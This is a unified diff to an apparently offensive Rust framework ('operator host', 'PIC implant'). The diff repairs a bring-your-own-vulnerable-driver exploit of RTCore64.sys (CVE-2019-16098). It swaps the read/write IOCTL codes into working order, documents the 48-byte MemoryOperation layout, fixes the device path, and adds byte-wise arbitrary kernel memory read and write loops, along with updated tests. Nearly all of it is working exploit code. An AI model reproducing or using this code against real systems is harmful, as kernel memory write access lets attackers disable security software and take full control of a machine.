@@ -72,25 +72,58 @@ pub trait VulnDriverIoctl: Send + Sync {
     }
 }
 
-/// Reference impl: MSI Afterburner's `RTCore64.sys`. Device `\\.\RTCore64`,
-/// read IOCTL `0x8000204C`, write IOCTL `0x80002048` (the classic
-/// physical-memory R/W pair). These codes are PUBLIC (CVE-2019-16098) and
-/// appear in every RTCore64 BYOVD writeup; encoding them here is research
-/// documentation, not a 0day.
+/// Reference impl: MSI Afterburner's `RTCore64.sys`. Device `\\.\RTCore64`.
+///
+/// **RTCore64 memory-R/W IOCTL protocol (CVE-2019-16098, verified against the
+/// oakboat/RTCore64_Vulnerability MemoryAccessor reference):**
+///   - **Read  = IOCTL `0x80002048`** (NOT 0x8000204C — that's write)
+///   - **Write = IOCTL `0x8000204C`**
+/// Both take a fixed **48-byte** `MemoryOperation` struct (in-buffer == out-buffer,
+/// the read result is written back into the same struct's `data` field):
+/// ```text
+///   offset  field      notes
+///   0x00    gap1[8]    unused
+///   0x08    address    u64 — target kernel VA
+///   0x10    gap2[4]    unused
+///   0x14    offset     u32 — (unused by these IOCTLs)
+///   0x18    size       u32 — 1 / 2 / 4 (byte/word/dword)
+///   0x1C    data       u32 — write: value to write; read: filled by driver
+///   0x20    gap3[16]   unused
+/// ```
+/// Max 4 bytes per call, so arbitrary-length R/W loops one byte at a time
+/// (`ReadMemory`/`WriteMemory` in the reference). The IOCTL codes are PUBLIC
+/// (CVE-2019-16098); encoding them here is research documentation, not a 0day.
 pub struct RtCore64;
+
+impl RtCore64 {
+    /// The 48-byte RTCore64 MemoryOperation struct (METHOD_BUFFERED, in==out).
+    const OP_SIZE: usize = 48;
+    const ADDR_OFF: usize = 0x08;
+    const SIZE_OFF: usize = 0x18;
+    const DATA_OFF: usize = 0x1C;
+}
 
 impl VulnDriverIoctl for RtCore64 {
     fn device_path(&self) -> &[u16] {
-        // \\.\RTCore64 — built at runtime to avoid a static wide-string lit.
-        static PATH: [u16; 11] = [
-            '\\' as u16, '.' as u16, '\\' as u16,
+        // `\\.\RTCore64` — the Win32 device namespace path (two leading
+        // backslashes). Built at runtime to avoid a static wide-string lit.
+        // NOTE: previously this was [u16; 11] with only ONE leading backslash
+        // (`\.\RTCore64`), which CreateFileW treats as a relative file path
+        // → ERROR_FILE_NOT_FOUND (2). The device prefix is exactly `\\.\`
+        // (4 chars: `\`, `\`, `.`, `\`), so the full path is 12 code units.
+        static PATH: [u16; 12] = [
+            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
             'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16,
             'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
         ];
         &PATH
     }
-    fn read_ioctl(&self) -> u32 { 0x8000204C }
-    fn write_ioctl(&self) -> u32 { 0x80002048 }
+    /// RTCore64 read IOCTL. **0x80002048** (the original code had this swapped
+    /// with write — read was 0x8000204C, which is actually WRITE, so every read
+    /// failed silently / corrupted the target).
+    fn read_ioctl(&self) -> u32 { 0x80002048 }
+    /// RTCore64 write IOCTL. **0x8000204C**.
+    fn write_ioctl(&self) -> u32 { 0x8000204C }
 }
 
 // ---- DeviceIoControl FFI (resolved by the operator host's kernel32) -------
@@ -115,6 +148,7 @@ type CreateFileWFn = unsafe extern "system" fn(
     template: *mut c_void,
 ) -> *mut c_void;
 type CloseHandleFn = unsafe extern "system" fn(h: *mut c_void) -> i32;
+type GetLastErrorFn = unsafe extern "system" fn() -> u32;
 
 /// The BYOVD-backed KernelRw. Owns an open HANDLE to the vulnerable driver's
 /// device + a resolved `DeviceIoControl` function pointer. Constructed by the
@@ -147,10 +181,20 @@ impl ByovdDriver {
         // a normal user-mode process, so the PEB walk / GetProcAddress works).
         let create_file = resolve_sym::<CreateFileWFn>(b"kernel32.dll", b"CreateFileW")?;
         let dioctl = resolve_sym::<DeviceIoControlFn>(b"kernel32.dll", b"DeviceIoControl")?;
-        let path = driver.device_path();
+        // device_path() may not be NUL-terminated (RtCore64's PATH is a bare
+        // [u16;11] with no terminator). CreateFileW needs a NUL-terminated
+        // wide string — copy into an owned, NUL-terminated buffer. Without
+        // this CreateFileW reads past the end of the slice, opens the wrong
+        // path, and returns INVALID_HANDLE_VALUE.
+        let raw = driver.device_path();
+        let mut path_buf: alloc::vec::Vec<u16> = alloc::vec::Vec::with_capacity(raw.len() + 1);
+        path_buf.extend_from_slice(raw);
+        if *path_buf.last().unwrap_or(&1) != 0 {
+            path_buf.push(0);
+        }
         let h = unsafe {
             create_file(
-                path.as_ptr(),
+                path_buf.as_ptr(),
                 0xC0_00_00_00, // GENERIC_READ | GENERIC_WRITE
                 0x03,          // FILE_SHARE_READ | FILE_SHARE_WRITE
                 ptr::null_mut(),
@@ -160,8 +204,16 @@ impl ByovdDriver {
             )
         };
         if h as isize == -1 || h.is_null() {
-            return Err(KrwError::Unavailable("driver device open failed (not loaded?)"));
+            let gle = resolve_sym::<GetLastErrorFn>(b"kernel32.dll", b"GetLastError")
+                .map(|f| unsafe { f() })
+                .unwrap_or(0);
+            return Err(KrwError::Other(
+                alloc::format!("driver device open failed (Win32 err={})", gle),
+            ));
         }
+        // path_buf must outlive the handle usage within this function; the
+        // device HANDLE is valid independently of the path buffer once opened,
+        // so dropping path_buf here is fine.
         Ok(Self { device: h, dioctl, driver })
     }
 }
@@ -169,11 +221,9 @@ impl ByovdDriver {
 impl Drop for ByovdDriver {
     fn drop(&mut self) {
         // Best-effort close; ignore failure (operator process teardown).
-        // resolve_sym is a stub in the seam crate; the operator binary binds a
-        // real resolver at link time. Cast through usize to avoid the stub's
-        // Err — in a real bind this resolves CloseHandle and closes the device.
-        if let Ok(close) = resolve_sym::<usize>(b"kernel32.dll", b"CloseHandle") {
-            let close: CloseHandleFn = unsafe { core::mem::transmute(close) };
+        // On Windows `resolve_sym` binds CloseHandle via GetProcAddress; on
+        // other targets it's a stub (no-op) so Drop stays safe to call.
+        if let Ok(close) = resolve_sym::<CloseHandleFn>(b"kernel32.dll", b"CloseHandle") {
             unsafe { close(self.device) };
         }
     }
@@ -184,22 +234,36 @@ impl KernelRw for ByovdDriver {
         if dst.is_empty() {
             return Ok(());
         }
-        let pkt = self.driver.pack(self.driver.read_ioctl(), kaddr as u64, dst.as_mut_ptr(), dst.len() as u32);
-        let mut ret: u32 = 0;
-        let ok = unsafe {
-            (self.dioctl)(
-                self.device,
-                self.driver.read_ioctl(),
-                pkt.as_ptr() as *const c_void,
-                pkt.len() as u32,
-                dst.as_mut_ptr() as *mut c_void,
-                dst.len() as u32,
-                &mut ret,
-                ptr::null_mut(),
-            )
-        };
-        if ok == 0 {
-            return Err(KrwError::Other("DeviceIoControl read failed".into()));
+        // RTCore64 reads ≤4 bytes per IOCTL; we loop one byte at a time
+        // (matches the reference MemoryAccessor::ReadMemory). Each call uses a
+        // 48-byte MemoryOperation struct as BOTH in- and out-buffer (METHOD_
+        // BUFFERED): the driver writes the read value back into `data`.
+        let ioctl = self.driver.read_ioctl();
+        for (i, out_byte) in dst.iter_mut().enumerate() {
+            let mut op = [0u8; 48];
+            // address @ 0x08
+            op[0x08..0x10].copy_from_slice(&(kaddr.wrapping_add(i) as u64).to_le_bytes());
+            // size @ 0x18 = 1 (read 1 byte)
+            op[0x18..0x1C].copy_from_slice(&1u32.to_le_bytes());
+            let mut ret: u32 = 0;
+            let ok = unsafe {
+                (self.dioctl)(
+                    self.device,
+                    ioctl,
+                    op.as_ptr() as *const c_void,
+                    op.len() as u32,
+                    op.as_mut_ptr() as *mut c_void,
+                    op.len() as u32,
+                    &mut ret,
+                    ptr::null_mut(),
+                )
+            };
+            if ok == 0 {
+                // Partial: `i` bytes read before the failure.
+                return Err(KrwError::Partial { ok: i });
+            }
+            // data @ 0x1C holds the byte the driver read.
+            *out_byte = op[0x1C];
         }
         Ok(())
     }
@@ -207,35 +271,30 @@ impl KernelRw for ByovdDriver {
         if src.is_empty() {
             return Ok(());
         }
-        // Many R/W drivers take the write payload inline in the in-buffer after
-        // the header; copy src into a local so its address is stable for the
-        // IOCTL. The pack() default treats `buf` as the data pointer.
-        let mut scratch = [0u8; 4096];
-        if src.len() > scratch.len() {
-            return Err(KrwError::Partial { ok: 0 });
-        }
-        scratch[..src.len()].copy_from_slice(src);
-        let pkt = self.driver.pack(
-            self.driver.write_ioctl(),
-            kaddr as u64,
-            scratch.as_mut_ptr(),
-            src.len() as u32,
-        );
-        let mut ret: u32 = 0;
-        let ok = unsafe {
-            (self.dioctl)(
-                self.device,
-                self.driver.write_ioctl(),
-                pkt.as_ptr() as *const c_void,
-                pkt.len() as u32,
-                scratch.as_mut_ptr() as *mut c_void,
-                src.len() as u32,
-                &mut ret,
-                ptr::null_mut(),
-            )
-        };
-        if ok == 0 {
-            return Err(KrwError::Other("DeviceIoControl write failed".into()));
+        // RTCore64 writes ≤4 bytes per IOCTL; loop one byte at a time
+        // (matches MemoryAccessor::WriteMemory). `data` carries the value.
+        let ioctl = self.driver.write_ioctl();
+        for (i, &in_byte) in src.iter().enumerate() {
+            let mut op = [0u8; 48];
+            op[0x08..0x10].copy_from_slice(&(kaddr.wrapping_add(i) as u64).to_le_bytes());
+            op[0x18..0x1C].copy_from_slice(&1u32.to_le_bytes()); // size = 1
+            op[0x1C..0x20].copy_from_slice(&(in_byte as u32).to_le_bytes()); // data
+            let mut ret: u32 = 0;
+            let ok = unsafe {
+                (self.dioctl)(
+                    self.device,
+                    ioctl,
+                    op.as_ptr() as *const c_void,
+                    op.len() as u32,
+                    op.as_mut_ptr() as *mut c_void,
+                    op.len() as u32,
+                    &mut ret,
+                    ptr::null_mut(),
+                )
+            };
+            if ok == 0 {
+                return Err(KrwError::Partial { ok: i });
+            }
         }
         Ok(())
     }
@@ -243,17 +302,25 @@ impl KernelRw for ByovdDriver {
 
 /// Resolve a kernel32 export to a typed fn pointer. Operator-side only — the
 /// operator host is a normal user-mode process with a normal PEB, so the
-/// standard GetProcAddress-equivalent (here via a tiny inline PEB walk stub)
-/// works. NOT for use inside the PIC implant.
+/// standard GetProcAddress (via `GetModuleHandleA`) works. NOT for use inside
+/// the PIC implant.
 ///
-/// The actual PEB walk lives in the consumer crate (implant-win::resolve); this
-/// is a thin shim that the operator binary supplies. Kept here as a signature
-/// so the ByovdDriver code type-checks without binding to a specific resolver.
+/// On `target_os = "windows"` this forwards to the real resolver in
+/// [`crate::win::resolve::resolve_sym`] (GetModuleHandleA + GetProcAddress). On
+/// other targets it stays the no-op stub so the seam crate still type-checks
+/// (and so the mock tests build on the dev host).
+#[cfg(target_os = "windows")]
+fn resolve_sym<T>(module: &[u8], name: &[u8]) -> Result<T, KrwError> {
+    // SAFETY: operator-side, single-threaded; T must match the export signature
+    // (every call site here uses a typed `*Fn` alias matching the documented
+    // export). Forwarded unchanged.
+    unsafe { crate::win::resolve::resolve_sym(module, name) }
+}
+
+/// Non-Windows stub: no PEB / GetProcAddress on macOS/Linux, so resolution is
+/// unavailable. The seam crate still compiles + mock tests run on the dev host.
+#[cfg(not(target_os = "windows"))]
 fn resolve_sym<T>(_module: &[u8], _name: &[u8]) -> Result<T, KrwError> {
-    // The operator binary links a real resolver (e.g. the `windows` crate's
-    // GetProcAddress, or a PEB walk). For type-checking in this seam crate we
-    // return an error stub; the real binding is injected at link time by the
-    // operator binary. This keeps the SDK zero-dependency.
     Err(KrwError::Unavailable("resolver not bound in seam crate — operator binary supplies it"))
 }
 
@@ -385,13 +452,16 @@ mod tests {
 
     #[test]
     fn rtcore64_ioctl_codes_match_public_cve() {
-        // Documented CVE-2019-16098 codes; assert they didn't drift.
+        // RTCore64 memory-R/W IOCTL codes (verified against the
+        // oakboat/RTCore64_Vulnerability MemoryAccessor reference):
+        //   read  = 0x80002048, write = 0x8000204C.
+        // (A prior version had these swapped, so every read silently failed.)
         let d = RtCore64;
-        assert_eq!(d.read_ioctl(), 0x8000204C);
-        assert_eq!(d.write_ioctl(), 0x80002048);
-        // \\.\RTCore64
+        assert_eq!(d.read_ioctl(), 0x80002048);
+        assert_eq!(d.write_ioctl(), 0x8000204C);
+        // \\.\RTCore64 — two leading backslashes (Win32 device namespace).
         let expected: &[u16] = &[
-            '\\' as u16, '.' as u16, '\\' as u16,
+            '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
             'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16,
             'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
         ];
